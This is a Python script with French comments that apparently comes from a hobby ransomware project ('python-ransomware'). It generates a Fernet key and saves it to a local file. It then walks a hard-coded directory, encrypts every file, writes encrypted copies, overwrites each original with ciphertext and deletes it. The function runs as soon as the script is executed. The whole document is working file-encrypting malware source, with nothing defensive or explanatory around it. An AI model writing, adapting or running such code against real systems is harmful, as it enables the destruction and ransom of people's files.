from cryptography.fernet import Fernet
import os

def cryptage ():

    '''Generer la cle de cyptage AES 128 bit '''

    key = Fernet.generate_key()

    ''' Cree le fichier keyfile en editant la cle generer '''

    with  open("keyfile",'wb') as f:
        f.write(key)

    ''' Creer l'instance de cryptage '''

    crypt = Fernet(key)

    #extension_target = ['.txt']

    '''Definir la racine des fichiers a  cripter '''

    dest = '/Users/mac/Documents/projets/Scripts/python-ransomware/test'

    '''Parcourrir les fichiers qui sont sur la racine'''

    for root, dirs, files in os.walk(dest):
        for file in files:

            '''Cree le chemin complet de tous les fichiers qui sont sur la racine'''

            full_path = os.path.join(root,file)
            new_file =  '(crypted)' + os.path.basename(full_path)
            path_new_file = os.path.join(root,new_file)

            #if full_path.split('.')[-1] not in extension_target:
             #   continue
            #print (full_path)
            ''' Ouvrir les fichiers '''

            with open(full_path,'rb+') as file_crypt:

                '''Lire le contenu et afficher '''

                _data = file_crypt.read()
                #print ("Crypatage du contenu du fichier : %s" %(_data))

                '''Crypter le contenu avec l instance defini en haut'''

                data = crypt.encrypt(_data)

                with open(path_new_file,'wb+') as p:
                    p.seek(0)
                    p.write(data)
                    p.close()

                '''Ecrire le contenu crypter dans le fichier et fermer le fichier'''

                file_crypt.seek(0)
                file_crypt.write(data)
                file_crypt.close()
            os.remove(full_path)

cryptage()